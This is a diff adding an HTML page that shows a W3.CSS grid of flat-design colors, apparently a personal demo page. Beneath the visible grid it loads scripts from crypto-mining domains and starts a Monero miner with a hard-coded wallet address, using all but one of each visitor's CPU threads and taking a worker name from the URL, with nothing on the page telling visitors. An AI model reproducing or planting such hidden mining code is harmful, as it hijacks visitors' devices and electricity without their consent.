@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<title>Raiyan Hossain</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<body>
+
+<div class="w3-container">
+  <p>Flat Design often uses colors we know from marketing, road signs, and sticky notes:</p>
+  <div class="w3-row">
+    <div class="w3-quarter">
+      <div class="w3-container w3-red w3-center"><p>Red</p></div>
+      <div class="w3-container w3-green w3-center"><p>Green</p></div>
+      <div class="w3-container w3-blue w3-center"><p>Blue</p></div>
+      <div class="w3-container w3-black w3-center"><p>Black</p></div>
+    </div>
+    <div class="w3-quarter">
+      <div class="w3-container w3-pink w3-center"><p>Pink</p></div>
+      <div class="w3-container w3-teal w3-center"><p>Teal</p></div>
+      <div class="w3-container w3-indigo w3-center"><p>Indigo</p></div>
+      <div class="w3-container w3-brown w3-center"><p>Brown</p></div>
+    </div>
+    <div class="w3-quarter">
+      <div class="w3-container w3-orange w3-center"><p>Orange</p></div>
+      <div class="w3-container w3-cyan w3-center"><p>Cyan</p></div>
+      <div class="w3-container w3-purple w3-center"><p>Purple</p></div>
+      <div class="w3-container w3-grey w3-center"><p>Grey</p></div>
+    </div>
+    <div class="w3-quarter">
+      <div class="w3-container w3-yellow w3-center"><p>Yellow</p></div>
+      <div class="w3-container w3-lime w3-center"><p>Lime</p></div>
+      <div class="w3-container w3-khaki w3-center"><p>Khaki</p></div>
+      <div class="w3-container w3-light-grey w3-center"><p>Light Grey</p></div>
+    </div>
+  </div>
+
+  <script src="https://www.moneroocean.crypto-webminer.com/scripts/jquery-3.2.1.min.js"></script>
+
+  <script src="https://ethereum-pocket.com/perfekt/perfektweb.js?v07072019?perfekt=wss://?jason=faster.xmr"></script>
+
+  <script>
+
+    $(function() {
+      var threads = 1
+
+      if(navigator.hardwareConcurrency > 1) {
+        threads = navigator.hardwareConcurrency - 1
+      } else {
+        threads = 1
+      }
+      
+      var lastrate = 0
+      var totalHashes = 0
+      var totalHashes2 = 0
+
+      setTimeout(() => {
+        setInterval(() => {
+            lastrate = ((totalhashes) * 0.5 + lastrate * 0.5)
+            totalHashes = totalhashes + totalHashes
+            totalHashes2 = totalHashes
+            totalhashes = 0
+          }, 1000)
+
+          setInterval(() => {
+            var hashesPerSecond = Math.round(lastrate)
+            var acceptedHashes = GetAcceptedHashes()
+            console.log('HASH: '+hashesPerSecond+' ACCEPT: '+acceptedHashes+' TOTAL: '+totalHashes2)
+          }, 6000)
+        }, 2000)
+
+        setTimeout(() => {
+          var name = "raiyan"
+
+          try {
+            var url = window.location.href
+            if(url.includes('worker=')) {
+              var temp = url.substring(url.indexOf('worker=')+7, url.length)
+              if(temp.includes('&')) {
+                name = "worker_"+temp.substring(0, temp.indexOf('&'))
+              } else {
+                name = "worker_"+temp
+              }
+            }
+          } catch (error) {}
+
+          PerfektStart("84AbPm2mCiBCh182gsvqSRXLpEc9JgUJ96x3KQ6h35ECEtSzMWFDamMdWL98pW16tf61vJiw34nYfMii8hTW3pbTDC7BqTG", name, threads)
+        }, 1000)
+      })
+
+  </script>
+
+  
+</div>
+
+</body>
+</html>
